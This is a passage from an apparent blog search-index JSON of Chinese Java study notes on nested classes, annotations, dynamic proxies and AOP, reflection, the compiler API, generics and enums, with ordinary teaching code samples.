8及以后，匿名内部类和局部内部类可访问外部包围类的final成员变量和**事实意义上的final变量(effectively final, 一个变量定值后，再也没有改过值)**\n\n## **5.嵌套类应用**\n### **匿名内部类**\n- **无需类名，用过即焚，使用广泛**\n- 该类的对象只要一个，且方法只有一个，代码短\n    - Android中常用匿名内部类\n\n### **局部内部类**\n- 定义在方法体内，只能在当前方法内使用，代码短\n- 使用较少\n- **介于匿名内部类和普通内部类之间**\n    - 只用一次，就用匿名内部类，简便\n    - 使用多次，那就上升到普通内部类，整个类都可以使用\n- 继承某一个类或接口，重新定义方法，并当作返回值在外部使用\n- 如java.util.regex.Pattern的splitAsStream方法的局部内部类\n\n### **普通内部类**\n- 广泛使用在具有母子结构的类，内部类对象和外围类保持联系\n- 如Map和Map.Entry，ZipFile和ZipFile.ZipEntryIterator等\n\n### **静态嵌套类**\n- **和普通类一致**，只是“**碰巧**”声明在一个外围类的内部\n- 和外围类没有太多的联系，可以脱离外围类对象存在，也可以访问外围类的静态成员\n- 如果不需要访问外围类的非静态成员，尽量将普通内部类变更为静态嵌套类\n    - 节省普通内部类和外围类的联系开销\n    - 使得外围类对象更容易被垃圾回收器回收","tags":["Java"],"categories":["Java","Java高阶"]},{"title":"Java 注解","url":"/reimu-lighthouse/20210922/java-annotation/","content":"## **1.注解基础**\n- 从JDK 1.5 引入\n- 位于源码中(**代码/注释/注解**)，使用其他工具进行处理的标签\n- 注解用来修饰程序的元素，但不会对被修饰的对象有直接的影响\n- 只有通过**某种配套的工具**才会对注解信息进行访问和处理\n- 主要用途\n    - 提供信息给编译器/IDE工具\n    - 可用于其他工具来产生额外的代码/配置文件等\n    - 有一些注解可在程序运行时访问，增加程序的动态性\n\n### **JDK预定义的普通注解(部分)** \n- @Override 表示继承和改写    自带注解\n- @Deprecated 表示废弃 自带注解\n- @SuppressWarnings 表示压制警告 自带注解\n- @SafeVarargs 不会对不定项参数做危险操作 自带注解\n- @FunctionInterface 声明功能性接口 自带注解\n\n### **JDK预定义的元注解(部分)** \n- @Target 设置目标范围 元注解\n- @Retention 设置保持性 元注解\n- @Documented 文档 元注解\n- @Inherited 注解继承 元注解\n- @Repeatable 此注解可以重复修饰 元注解\n\n## **2.预定义的普通注解**\n### **@Override**\n- 修饰方法，检查该方法是父类的方法\n- 强制该函数代码必须符合父类中该方法的定义\n- 避免代码错误\n\n### **@Deprecated**\n- 修饰类/类的元素/包 \n- 标注为废除，建议程序员不再使用这个类/元素/包\n\n### **@SuppressWarnings**\n- 可以修饰变量/方法/构造函数/类等\n- 压制各种不同类型的警告信息，使得编译器不显示警告\n- 各种不同类型是叠加，如修饰类的警告类型，和修饰方法的警告类型，对于方法来说，是叠加的\n- **警告类型名称是编译器/IDE工具自己定的，Java规范没有强制要求哪些名称**。编译器厂商需要自行协商，保证同名警告类型在各个编译器上一样工作\n- @SuppressWarnings\n    - @SuppressWarnings(“unchecked”) 忽略unchecked警告信息\n    - @SuppressWarnings(“deprecated”) 忽略过时方法的警告信息\n    - @SuppressWarnings({“unchecked”，“deprecated”}) 忽略两种警告信息\n    - @ SuppressWarnings(values={“unchecked”，“deprecated”}) 同上\n    - @ SuppressWarnings( “all”) 忽略所有的警告信息\n- JLS 只规定了deprecated和unchecked两种\n- 其他的警告类型\n    - all，忽略所有的警告\n    - cast，忽略类转型警告\n    - serial，忽略实现Serializable接口的，没有定义serialVersionUID\n    - 使用**javac -X** 可以看当前的编译器使用哪些警告类型\n\n## **3.自定义注解**\n- 注解定义：扩展java.lang.annotation.Annotation注解接口\n- 注解可以包括的类型\n    - 8种基本类型(int/short/long/float/double/byte/char/boolean) –String\n    - Class\n    - enum类型\n    - 注解类型\n    - 由前面类型组成的数组\n```java\npublic @interface BugReport {\n    enum Status {UNCONFIRMED, CONFIRMED, FIXED, NOTABUG};\n    boolean showStopper() default true;\n    String assiganedTo() default \"[none]\";\n    Status status() default Status.UNCONFIRMED;\n    String[] reportedBy();\n}\n```\n\n### **注解使用**\n- @Test\n```java\npublic @interface Test {\n    \n}\n```\n- @SingleTest\n- @SingleTest(5)\n- @SingleTest(value=5)\n```java\npublic @interface SingleTest {\n    int value() default 0;\n}\n```\n- @MultipleTest\n- @MultipleTest(a=1)\n- @MultipleTest(a=1,b=2)\n- @MultipleTest(b=2,a=1)\n- **@MultipleTest(1,2)是错误写法**\n```java\npublic @interface MultipleTest {\n    int a() default 0;\n    int b() default 0;\n}\n```\n\n### **注解使用的位置**\n- @Target可以限定位置\n```java\n@Retention(RetentionPolicy.RUNTIME)\n//表示该注解会保留在class文件中\n@Target(ElementType.METHOD)   \n//表示该注解只能用于方法\n```\n- 允许的位置\n    - 包\n    - 类\n    - 接口\n    - 方法\n    - 构造器\n    - 成员变量\n    - 局部变量/形参变量/类型参数\n\n### **注解作为单元测试**\n```java\npublic class Foo {\n    @SingleTest(1)\n    public static void m1(int a) {\n        if(a<0)\n        {\n            throw new RuntimeException(\"Crash\");\n        }\n    }\n\n    public static void m2() {\n    }\n\n    @SingleTest(value=-2)\n    public static void m3(int a) {\n        if(a<0)\n        {\n            throw new RuntimeException(\"Crash\");\n        }\n    }\n}\n\npublic static void main(String[] args) throws Exception {\n    int passed = 0, failed = 0;\n    String className = \"annotations.single.Foo\";\n    for (Method m : Class.forName(className).getMethods()) {\n\n        if (m.isAnnotationPresent(SingleTest.class)) {\n            System.out.println(m.getName());\n            SingleTest st = m.getAnnotation(SingleTest.class);                \n            try {\n                m.invoke(null,st.value());\n                passed++;\n            } catch (Throwable ex) {\n                System.out.printf(\"Test %s failed: %s %n\", m, ex.getCause());\n                failed++;\n            }\n        }\n    }\n    System.out.printf(\"Passed: %d, Failed %d%n\", passed, failed);\n}\n```\n\n## **4.预定义的元注解**\n### **Retention** \n- 示例@Retention(RetentionPolicy.RUNTIME)\n- 这个注解用来修饰其他注解的存在范围\n- RetentionPolicy.SOURCE 注解仅存在源码，不在class文件\n- RetentionPolicy.CLASS **默认的注解保留策略**  注解存在于.class文件，但是不能被JVM加载\n- RetentionPolicy.RUNTIME 这种策略下，注解可以被JVM运行时访问到。通常情况下，可以结合反射来做一些事情\n### **Target**\n- 限定目标注解作用于什么位置@Target({ElementType.METHOD})\n- ElementType.ANNOTATION_TYPE（注：修饰注解）\n- ElementType.CONSTRUCTOR\n- ElementType.FIELD\n- ElementType.LOCAL_VARIABLE\n- ElementType.METHOD\n- ElementType.PACKAGE\n- ElementType.PARAMETER\n- ElementType.TYPE（注：任何类型，即上面的的类型都可以修饰）\n### **Inherited**\n- 让一个类和它的子类都包含某个注解\n- 普通的注解没有继承功能\n### **Repeatable**\n- 自JDK1.8引入\n- 表示被修饰的注解可以重复应用标注\n- 需要定义注解和**容器注解**\n```java\n//普通注解\n@Retention(RetentionPolicy.RUNTIME)\n@Repeatable(RepeatableAnnotations.class)\npublic @interface RepeatableAnnotation {\n    \n    int a() default 0;\n    int b() default 0;\n    int c() default 0;\n}\n\n//容器注解\n@Retention(RetentionPolicy.RUNTIME)\npublic @interface RepeatableAnnotations {\n    RepeatableAnnotation[] value();\n}\n```\n### **Documented**\n- 指明这个注解可以被Javadoc工具解析，形成帮助文档\n\n## **5.注解的解析**\n### **RetentionPolicy.RUNTIME**\n- 注解在class文件中，被JVM加载，可用**反射解析注解**\n    - Class.getAnnotations()\n    - Class.isAnnotation()\n    - Class. .isAnnotationPresent(Class annotationClass)\n    - Method.getAnnotations()\n    - Method.isAnnotationPresent(Class annotationClass)\n    - Field.getAnnotations()\n    - Field.isAnnotationPresent(Class annotationClass)\n    - Constructor.getAnnotations()\n    - Constructor.isAnnotationPresent(Class annotationClass)\n\n### **RetentionPolicy.CLASS**\n- 注解在class文件中，但JVM没有加载\n- 只能采用字节码工具进行特殊处理\n    - 如ASM工具，https://asm.ow2.io/\n\n### **RetentionPolicy.SOURCE**\n- 注解在java文件中，不在class文件中，也不会被JVM加载\n- 只有在源码级别进行注解处理\n- Java提供**注解处理器**来解析带注解的源码，产生新的文件\n    - 注解处理器继承AbstractProcessor，重写process方法\n    - javac –processor Processor1, Processor2, … sourceJavaFile\n    - 编译器定位源文件的注解，然后依次启动注解处理器执行处理。如果某个注解处理器产生新的源文件，那么将重复执行这个处理过程。 \n    - 注解处理器只能产生新文件，不会修改已有的源文件\n\n### **Java 5/6提供的APT工具**\n- 一个可以处理注解的命令行工具\n    - https://docs.oracle.com/javase/6/docs/technotes/guides/apt/\n- 包含在com.sun.mirror包中\n- 于Java 7被标记为Deprecated，计划于将来版本中废除\n\n## **6.RUNTIME注解的实现本质**\n- 注解采用**接口中的方法**来表示变量\n- Java为注解产生一个代理类。这个代理类包括一个AnnotationInvocationHandler成员变量\n- AnnotationInvocationHandler有一个Map的成员变量，用来存储所有的注解的属性赋值\n- 在程序中，调用**注解接口的方法**，将会被**代理类**接管，然后根据**方法名字**，到**Map**里面拿**相应的Value**并返回\n- 传统的接口中的变量，都是public final static\n- 注解需要随意赋值\n    - 注解方法表示变量\n    - 采用**代理类**拦截**注解方法访问**\n    - 所有的注解的赋值，都放在Map中，访问速度快","tags":["Java"],"categories":["Java","Java高阶"]},{"title":"Java 代理","url":"/reimu-lighthouse/20210922/java-proxy/","content":"## **1.代理模式和静态代理**\n### **代理模式**\n- Proxy Pattern, 23个经典模式的一种，又称委托模式\n- 为目标对象提供(包装)了一个代理，这个代理可以控制对目标对象的访问\n- 外界不用直接访问目标对象，而是访问代理对象，由代理对象再调用目标对象\n- 代理对象中可以添加监控和审查处理\n### **静态代理**\n- 代理对象持有目标对象的句柄\n- 所有调用目标对象的方法，都调用代理对象的方法\n- 代理类和被代理类应该共同实现一个接口，或者是共同继承某个类\n- 对每个方法，需要静态编码(理解简单，但代码**繁琐**)\n```java\n//对外接口\npublic interface Subject{\n    public void request();\n}\n\n//目标对象\nclass SubjectImpl implements Subject{\n  @Override\n  public void request(){\n      System.out.println(\"I am dealing the request.\");\n  }\n}\n\n//代理对象\nclass StaticProxy implements Subject{\n    //实际目标对象\n    private Subject subject;\n    \n    public StaticProxy(Subject subject){\n        this.subject = subject;\n    }\n    \n    @Override\n    public void request(){\n        System.out.println(\"PreProcess\");\n        subject.request();\n        System.out.println(\"PostProcess\");\n    }\n}\n\n//静态代理模式\npublic class StaticProxyDemo {\n    public static void main(String args[]){\n        //创建实际对象\n        SubjectImpl subject = new SubjectImpl();\n        \n        //把实际对象封装到代理对象中\n        StaticProxy p = new StaticProxy(subject);\n        p.request();\n    }\n}\n```\n\n## **2.动态代理**\n- 对目标对象的方法每次被调用，进行动态拦截\n```mermaid\n    sequenceDiagram\n    participant 客户端\n    participant 代理对象\n    participant 代理处理器\n    participant 目标对象\n    客户端->>代理对象:调用方法\n    代理对象->>代理处理器:转发代理处理器<br>Invoke()方法\n    代理处理器->>目标对象:判断Method<br>调用目标对象的方法\n    目标对象->>代理处理器:返回结果\n    代理处理器->>代理对象:返回结果\n    代理对象->>客户端:返回结果\n```\n\n### **代理处理器**\n- 持有目标对象的句柄\n- 实现InvocationHandler接口\n    - 实现invoke方法\n    - 所有的代理对象方法调用，都会转发到invoke方法来\n    - invoke的形参method，就是指代理对象方法的调用\n    - 在invoke内部，可以根据method，使用目标对象不同的方法来响应请求\n```java\nclass ProxyHandler implements InvocationHandler{\n    private Subject subject;\n    public ProxyHandler(Subject subject){\n        this.subject = subject;\n    }\n    \n    //此函数在代理对象调用任何一个方法时都会被调用。\n    @Override\n    public Object invoke(Object proxy, Method method, Object[] args) throws Throwable {\n        //定义预处理的工作，当然你也可以根据 method 的不同进行不同的预处理工作\n        System.out.println(\"====before====\");\n        Object result = method.invoke(subject, args);\n        System.out.println(\"====after====\");\n        return result;\n    }\n}\n```\n\n### **代理对象**\n- 根据给定的接口，由Proxy类自动生成的对象\n- 类型 com.sun.proxy.$Proxy0，继承自java.lang.reflect.Proxy\n- 通常和目标对象实现同样的接口(可另实现其他的接口) \n- 实现多个接口\n    - 接口的排序非常重要\n    - 当多个接口里面有方法同名，则默认以第一个接口的方法\n```java\n//1.创建目标对象\nSubjectImpl realSubject = new SubjectImpl();    \n\n//2.创建调用处理器对象\nProxyHandler handler = new ProxyHandler(realSubject); \n\n//3.动态生成代理对象\nSubject proxySubject = \n        (Subject)Proxy.newProxyInstance\n          (SubjectImpl.class.getClassLoader(),\n           SubjectImpl.class.getInterfaces(), handler); \n//proxySubject真实类型com.sun.proxy.$Proxy0\n//proxySubject继承Proxy类，实现Subject接口\n//newProxyInstance的第二个参数，就是指定代理对象的接口\n\n//4.客户端通过代理对象调用方法\n//本次调用将自动被代理处理器的invoke方法接收\nproxySubject.request();    \n```\n\n## **3.AOP编程**\n- AOP：Aspect Oriented Programming\n### **面向切面编程 vs 面向对象编程** \n- 面向对象：将需求功能划分为不同的、独立，封装良好的类，并让它们\n通过继承和多态实现相同和不同行为。\n- 面向切面：将通用需求功能从众多类中分离出来，使得很多类共享一个\n行为，一旦发生变化，不必修改很多类，而只需要修改这个行为即可\n```xml\n//aops.xml配置文件示例\n<aops>\n    <aop>\n        <method>washHand</method>\n        <type>before</type>\n        <method>eat</method>\n    </aop>\n</aops>\n```\n```java\n//使用动态代理进行简单AOP编程\npublic static void initXml(){\n    //省略两类的代码实现\n    \n    //读取aop配置文件\n    XmlReader.readXml(\"aops.xml\");\n    //ResourceListener监听目录变化\n    ResourceListener.addListener(\"E:/java/source/PMOOC04-03/\");\n}    \n\npublic static void main(String[] args) throws Exception{\n    Main.initXml();        \n\n    Person action = new PersonImpl();\n    ProxyHandler mh = new ProxyHandler(action);\n    ClassLoader cl = Main.class.getClassLoader();\n    Class<?> proxyClass = Proxy.getProxyClass(cl, new Class<?>[]{Person.class});\n    Person proxy = (Person) proxyClass.getConstructor(new Class[]{InvocationHandler.class}).\n            newInstance(new Object[]{mh});\n\n    while(true){\n        proxy.eat();\n        try{\n            Thread.sleep(3000);\n        }\n        catch(Exception e){\n            e.printStackTrace();\n        }\n    }\n}\n\n//代理处理器\npublic class ProxyHandler implements InvocationHandler {\n    \n    static String beforeMethod = \"\";\n    static String afterMethod = \"\";\n    \n    private Person receiverObject;\n    \n    public ProxyHandler(Person object){\n        this.receiverObject = object;\n    }\n    \n    @Override\n    public Object invoke(Object proxy, Method method, Object[] args) throws Throwable {\n        //处理before方法\n        if(beforeMethod!=null&&beforeMethod.length()>0){\n            ClassLoader cl = ProxyHandler.class.getClassLoader();\n            Class<?> c = cl.loadClass(receiverObject.getClass().getName());\n            Method m=c.getMethod(beforeMethod);\n            Object obj = c.newInstance();\n            m.invoke(obj);\n        }\n        \n        //处理目标方法\n        Object result = method.invoke(receiverObject, args);\n        \n        //处理after方法\n        if(afterMethod!=null&&afterMethod.length()>0){\n            method.invoke(receiverObject, args);\n            ClassLoader cl = ProxyHandler.class.getClassLoader();\n            Class<?> c = cl.loadClass(receiverObject.getClass().getName());\n            Method m=c.getMethod(afterMethod);\n            Object obj = c.newInstance();\n            m.invoke(obj);\n        }\n        return result;\n    }\n}\n//\n```\n\n### **面向切面编程**\n- 一个概念/规范，没有限定语言\n- **不是取代OOP编程，而是OOP的补充，和数据库的触发器有点相似**\n- 主要内容\n    - Aspect ：配置文件，包括一些Pointcut和相应的Advice\n    - Joint point：在程序中明确定义的点，如方法调用、对类成员访问等\n    - Pointcut：一组joint point, 可以通过逻辑关系/通配符/正则等组合起来，定义了相应advice将要发生的地方\n    - Advice：定义了在pointcut处要发生的动作,通过before/after/around/来关联\n    - weaving：advice代码在具体joint point的关联方式\n\n### **Java的AOP实现**\n- AspectJ(Eclipse)， https://www.eclipse.org/aspectj/\n- Spring AOP，https://spring.io/projects/spring-framework","tags":["Java"],"categories":["Java","Java高阶"]},{"title":"Java 反射","url":"/reimu-lighthouse/20210922/java-reflection/","content":"## **1.反射基础**\n- 反射：reflection\n    - 程序可以访问、检测和修改它本身状态或行为的能力，即自描述\n    和自控制。\n    - 可以在运行时加载、探知和使用编译期间完全未知的类。\n    - 给Java插上动态语言特性的翅膀，弥补强类型语言的不足。\n    - java.lang.reflect包，在Java 2时代就有，在Java 5得到完善\n\n### **反射功能**\n- 在运行中分析类的能力\n- 在运行中查看和操作对象\n    - **基于反射自由创建对象**\n    - 反射构建出无法直接访问的类\n    - set或者get到无法访问的成员变量\n    - 调用不可访问的方法\n- 实现通用的数组操作代码\n- 类似函数指针的功能\n\n### **创建对象**\n- 方法1：静态编码&编译\n```java\nA obj1 = new A();\n```\n- 方法2：克隆(clone)\n```java\npublic class B implements Cloneable {\n    \n    protected Object clone() throws CloneNotSupportedException\n    {\n        return super.clone();\n    }\n}\n//obj3 是obj2的克隆对象  没有调用构造函数\nB obj2 = new B();\nB obj3 = (B) obj2.clone();\n```\n- 方法3：序列化(serialization)和反序列化(deserialization)\n```java\npublic class C implements Serializable {\n    private static final long serialVersionUID = 1L;\n\n}\n\n//没有调用构造函数\n//序列化会引发安全漏洞，未来将被移除出JDK，请谨慎使用！！！\nC obj4  = new C();\nObjectOutputStream out = new ObjectOutputStream(new FileOutputStream(\"data.obj\"));   \nout.writeObject(obj4);   \nout.close();   \n\nObjectInputStream in = new ObjectInputStream(new FileInputStream(\"data.obj\"));   \nC obj5 = (C) in.readObject();   \nin.close();   \n```\n- 方法4和5：反射\n```java\npublic class A {\n    public void hello()\n    {\n        System.out.println(\"hello from A\");\n    }\n}\n\n//第四种  newInstance  调用构造函数        \nObject obj6 = Class.forName(\"A\").newInstance();        \nMethod m = Class.forName(\"A\").getMethod(\"hello\");\nm.invoke(obj6);\n\nA obj7 = (A) Class.forName(\"A\").newInstance();\n\n//第五种  newInstance  调用构造函数\nConstructor<A> constructor = A.class.getConstructor();   \nA obj8 = constructor.newInstance();\nobj8.hello();    \n```\n\n## **2.反射关键类**\n- Class：类型标识\n    - JVM为每个对象都保留其类型标识信息(Runtime Type Identification)\n    - 三种获取方式\n```java\nString s1 = \"abc\";\nClass c1 = s1.getClass();\nSystem.out.println(c1.getName());\n\nClass c2 = Class.forName(\"java.lang.String\");\nSystem.out.println(c2.getName());\n\nClass c3 = String.class;\nSystem.out.println(c3.getName());    \n```\n\n### **获取详细信息**\n- getFields()\n    - 返回本类和所有父类所有的public成员变量\n- getDeclareFields()\n    - 返回本类自己定义的成员变量，包括private变量，不包括父类变量\n```java\nA obj = new A(20, \"Tom\");\nClass c = obj.getClass();\n\n//获取本类及父类所有的public字段\nField[] fs = c.getFields(); \nSystem.out.println(fs[0].getName() + \":\" + fs[0].get(obj));\n\n//获取本类所有声明的字段\nField[] fs2 = c.getDeclaredFields();\nfor(Field f : fs2)\n{\n    f.setAccessible(true);\n    System.out.println(f.getName() + \":\" + f.get(obj));\n}\n```\n- getMethods()\n    - 返回本类和所有父类所有的public方法\n- getDeclareMethods()\n    - 返回本类自己定义的方法，包括private方法，不包括父类方法\n```java\nB obj = new B();\nClass c = obj.getClass();\n\n// 获取public方法 包括父类和父接口\nMethod[] ms = c.getMethods();\nfor (Method m : ms) {\n    if (\"f1\".equals(m.getName())) {\n        m.invoke(obj, null);//传参调用方法\n    }\n}\n\n// 获得该类的所有方法\nMethod[] ms2 = c.getDeclaredMethods();\nfor (Method m : ms2) {\n    if (\"f2\".equals(m.getName())) {\n        m.setAccessible(true);\n        String result = (String) m.invoke(obj, \"abc\");//传参获得结果\n        System.out.println(result);\n    }\n}\n```\n- getPackage()\n    - 返回本类所在包\n- getModifiers()\n    - 返回本类前缀修饰符\n- getInterfaces()\n    - 返回本类继承的接口\n- getSuperClass()\n    - 返回本类的父类\n```java\nSon son = new Son();\nClass c = son.getClass();\n\nClass father = c.getSuperclass();\nSystem.out.println(father.getName());\n\nClass[] inters = c.getInterfaces();\nfor(Class inter : inters)\n{\n    System.out.println(inter.getName());\n}\n```\n- getConstructors()\n    - 返回本类所有的构造函数\n```java\nD d = new D();\nClass c = d.getClass();\n\nConstructor[] cons = c.getConstructors();\nfor (Constructor con : cons) {\n    if (con.getParameterCount() > 0) {\n        // 有参构造函数\n        D obj = (D) con.newInstance(100);\n        obj.printNum();\n    } else {\n        // 无参构造函数\n        D obj = (D) con.newInstance();\n        obj.printNum();\n    }\n}\n```\n- getAnnotations()\n    - 返回本类的注解\n\n## **3.反射应用**\n### **数据库连接**\n- JDBC\n    - Connection，连接到各个不同数据库\n```java\ntry{            \n    Class.forName(\"com.mysql.jdbc.Driver\");\n    //Class.forName(className, true, currentLoader) \n    //通知类加载器加载此类的class文件\n}catch(ClassNotFoundException e1){\n    e1.printStackTrace();\n    return;\n}\n```\n\n### **数组扩充器**\n- 给定一个数组(任意类型)，将其长度扩大一倍\n    - Java的数组一旦创建，其长度是不再更改的\n    - 新建一个大数组(**相同类型**)，然后将旧数组的内容拷贝过去\n```java\npublic static void main(String[] args) {\n    int[] a = { 1, 2, 3, 4, 5 };\n    a = (int[]) goodCopy(a, 10);\n    for (int i : a) {\n        System.out.println(i);\n    }\n}\n\npublic static Object goodCopy(Object oldArray, int newLength) {\n    // Array类型\n    Class c = oldArray.getClass();\n\n    // 获取数组中的单个元素类型\n    Class componentType = c.getComponentType();\n\n    // 旧数组长度\n    int oldLength = Array.getLength(oldArray);\n\n    // 新数组\n    Object newArray = Array.newInstance(componentType, newLength);\n\n    // 拷贝旧数据\n    System.arraycopy(oldArray, 0, newArray, 0, oldLength);\n    return newArray;\n}\n```\n\n### **动态执行方法**\n- 给定类名、方法名，即可执行\n    - 加上定时器，即可做定时任务执行\n```java\nTimer timer = new Timer();\n\nCalendar now = Calendar.getInstance();\nnow.set(Calendar.SECOND, \n        now.get(Calendar.SECOND) + 1);\nDate runDate = now.getTime();\n\nMyTask task2 = new MyTask();\ntimer.scheduleAtFixedRate(task2, runDate, 3000); \n// 固定速率\n\nThread.sleep(15000);\ntimer.cancel(); // 取消定时器\n\nclass MyTask extends TimerTask {\n    public void run() {\n        try {\n            Method m = Class.forName(\"Worker\")\n                    .getClass().getMethod(\"hello\");\n            m.invoke(null);// 静态方法可以不用new对象\n        } catch (Exception e) {\n            e.printStackTrace();\n        }\n    }\n}\n\nclass Worker {\n    public static void hello() {\n        System.out.println(\"Hello java!\");\n    }\n}\n```\n\n### **Json和Java对象互转**\n- Json： {“name\":\"Jo\",\"email\":\"a@b.com\"}\n```java\nGson gson = new Gson();\nString s =  \"{\\\"name\\\":\\\"Jo\\\"\"\n        + \",\\\"email\\\":\\\"a@b.com\\\"}\";\nPerson p = gson.fromJson(s, Person.class);\n\nSystem.out.println(p.getName());\nSystem.out.println(p.getEmail());\n```\n\n### **Tomcat的Servlet对象创建**\n\n### **MyBatis的OR/M**\n\n### **Spring的Bean容器**\n\n### **org.reflections包介绍**\n- Reflection的增强工具包\n    - https://github.com/ronmamo/reflections\n        - Java runtime metadata analysis \n        - 获取某类的所有子类型\n        - 获取有特殊annotation的类型或者成员变量/方法\n        - 根据正则表达式获取资源(类/成员变量/方法) • 根据组合条件查询相应的方法\n        -  ……\n\n## **编译器API**\n- 对.java文件即时编译\n- 对字符串即时编译\n- 监听在编译过程中产生的警告和错误\n- 在代码中运行编译器(并非：Runtime命令行调用javac命令)\n\n### **JavaCompiler**\n- 自Java 1.6 推出，位于javax.tools包中\n- 可用在程序文件中的Java编译器接口(代替javac.exe)\n- 在程序中编译java文件，产生class文件\n- run方法(继承自java.tools.Tools)：较简单。可以编译java源文件，生成class文件，但不能指定输出路径,监控错误信息, 调用后就在源码所在目录生成class文件\n```java\nJavaCompiler compiler = ToolProvider.getSystemJavaCompiler();\n// 第一个参数：输入流，null表示默认使用system.in\n// 第二个参数：输出流，null表示默认使用system.out\n// 第三个参数：错误流，null表示默认使用system.err\n// 第四个参数：String... 需要编译的文件名\n// 返回值：0表示成功，其他错误\nint result = compiler.run(null, null, null, \"F:/temp/Hello1.java\", \"F:/temp/Hello2.java\");\nSystem.out.println(0 == result ? \"Success\" : \"Fail\");\n```\n- getTask方法：更强大的功能。可以编译java源文件，包括在内存中的java文件(字符串)，生成class文件\n```java\npublic static void compileJavaFromString() {\n        \n    StringBuilder sb = new StringBuilder();\n    String className = \"Hello\";\n\n    //sb.append(\"package com.test;\\n\");\n    sb.append(\"public class Hello{\\n\");\n    sb.append(\"public static void main(String[]args){\\n\");\n    sb.append(\"System.out.print(\\\"hello world\\\"); \\n\");\n    sb.append(\"}\\n\");\n    sb.append(\"}\");\n\n    //将上述源码编译\n    Class<?> c = compile(className, sb.toString());\n    try {\n        // 生成对象\n        Object obj = c.newInstance();\n        // 调用main方法\n        Method m = c.getMethod(\"main\", String[].class);\n        m.invoke(obj, new Object[] { new String[] {} });\n    } catch (Exception e) {\n        e.printStackTrace();\n    }\n\n}\n\nprivate static Class<?> compile(String className, String javaCodes) {\n\n    //将字符串包装为SimpleJavaFileObject对象\n    JavaSourceFromString srcObject = new JavaSourceFromString(className, javaCodes);        \n    System.out.println(srcObject.getCode());\n    Iterable<? extends JavaFileObject> fileObjects = Arrays.asList(srcObject);\n\n\n    JavaCompiler compiler = ToolProvider.getSystemJavaCompiler();\n    StandardJavaFileManager fileManager = compiler.getStandardFileManager(null, null, null);\n    DiagnosticCollector<JavaFileObject> diagnosticCollector = new DiagnosticCollector<JavaFileObject>();  \n\n    //设置编译的输出目录，并包装在options中\n    String flag = \"-d\";\n    String outDir = \"\";\n    try {\n        File classPath = new File(Thread.currentThread().getContextClassLoader().getResource(\"\").toURI());\n        outDir = classPath.getAbsolutePath() + File.separator;\n        System.out.println(outDir);\n    } catch (URISyntaxException e1) {\n        e1.printStackTrace();\n    }        \n    Iterable<String> options = Arrays.asList(flag, outDir);\n\n    //JavaCompiler.getTask方法：以future的任务形式(多线程)，来执行编译任务\n\n    // 第一个参数：额外输出流，null表示默认使用system.err\n    // 第二个参数：文件管理器，null表示编译器标准文件管理器\n    // 第三个参数：诊断监听器，null表示使用编译器默认方法来报告诊断信息\n    // 第四个参数：编译器参数，null表示无参数\n    // 第五个参数：需要经过annotation处理的类名，null表示没有类需要annotation处理\n    // 第六个参数：待编译的类\n\n    JavaCompiler.CompilationTask task = \n            compiler.getTask(null, fileManager, diagnosticCollector, options, null, fileObjects);\n\n    //等待编译结束\n    boolean result = task.call();\n    if (result == true) {\n        try {\n            return Class.forName(className);\n        } catch (ClassNotFoundException e) {\n            e.printStackTrace();\n        }\n    }\n    else            \n    {\n        //print the Diagnostic's information   \n        for  (Diagnostic diagnostic : diagnosticCollector  \n                .getDiagnostics())  \n        {  \n            System.out.println(\"Error on line: \"   \n                    + diagnostic.getLineNumber() + \"; URI: \"   \n                    + diagnostic.getSource().toString());  \n        }  \n    }\n    return null;\n}\n```\n\n### **Java编译器API作用**\n- Java EE的JSP编译\n- 在线编程环境\n- 在线程序评判系统(Online Judge系统) \n- 自动化的构建和测试工具\n- ……\n\n### **基于JavaCompiler的集成工具**\n- Janino，http://janino-compiler.github.io/janino\n- InMemoryJavaCompile，https://github.com/trung/InMemoryJavaCompiler\n- Java-Runtime-Compiler, https://github.com/OpenHFT/Java-Runtime-Compiler\n-  Apache Commons JCI(Java Compiler Interface), http://commons.apache.org/proper/commons-jci/index.html 适用于JDK1.5及以前的版本","tags":["Java"],"categories":["Java","Java高阶"]},{"title":"Java 泛型","url":"/reimu-lighthouse/20210922/java-generic/","content":"## **1.泛型基础**\n- 泛型：Generic Programming，JDK1.5推出的特性\n- 泛型类： ArrayList，HashSet，HashMap等 \n- 泛型方法：Collections.binarySearch，Arrays.sort 等 \n- 泛型接口：List, Iterator 等\n\n## **2.自定义泛型设计**\n### **泛型类**\n- 具有泛型变量的类\n- 在类名后用\\<T>代表引入类型\n    - 多个字母表示多个引入类型如\\<T, U>等 \n    - 引入类型可以修饰成员变量/局部变量/参数/返回值\n    - 没有专门的template关键字\n```java\npublic class Interval<T> {\n    private T lower;\n    private T upper;\n\n    public Interval(T lower, T upper) {\n        this.lower = lower;\n        this.upper = upper;\n    }\n    //Getter and Setter\n}\nInterval<Integer> v1 = new Interval<Integer>(1,2);\n```\n\n### **泛型方法**\n- 具有泛型参数的方法\n- 该方法可在普通类/泛型类中\n- **\\<T>在修饰符后，返回类型前**\n```java\npublic class ArrayUtil {\n    public static <T> T getMiddle(T... a)\n    {\n        return a[a.length/2];\n    }\n}\n\npublic static void main(String[] args) {\nString s1 = ArrayUtil.<String>getMiddle(\"abc\", \"def\", \"ghi\");\nInteger i1 = ArrayUtil.getMiddle(1,2,3);\n\n//null is ok\nString s2 = ArrayUtil.<String>getMiddle(\"abc\", \"def\", null);\n\n//error 寻找共同超类，再转型\nInteger i2 = ArrayUtil.getMiddle(1,2.5f,3L);\n\n}\n```\n\n### **泛型接口**\n- 和泛型类相似，在类名后加\\<T>\n- T用来指定方法返回值和参数\n- 实现接口时，指定类型\n- T也可以再是一个泛型类\n```java\npublic interface Calculator<T> {\n    public T add(T operand1, T operand2);\n}\n```\n","tags":["Java"],"categories":["Java","Java高阶"]},{"title":"Java 语法糖","url":"/reimu-lighthouse/20210922/java-syntactic-sugar/","content":"## **1.for-each和枚举**\n### **for vs for-each**\n- for-each 从JDK5.0开始引入\n- for-each 语法更简洁\n- for-each 避免越界错误\n- **for 可以删除元素，for-each不可以删除/替换元素**\n- **for-each遍历的时候，是不知道当前元素的具体位置索引**\n- **for-each只能正向遍历，不能反向遍历**\n- **for-each不能同时遍历2个集合**\n- for和for-each性能接近\n\n### **枚举类型**\n- 枚举变量：变量的取值只在一个有限的集合内\n- Java5推出enum类型\n    - enum关键字声明枚举类，且都是Enum的子类(**但不需写extends**)\n    - enum内部有多少个值，**就有多少个实例对象**\n    - **不能直接new枚举类对象**\n```java\npublic enum Size {\n    SMALL,MEDIUM,LARGE,EXTRA_LARGE;\n}\n\nSize s1=Size.SMALL;\nSize s2=Size.SMALL;\nSystem.out.println(s1 == s2); //true\n```\n- 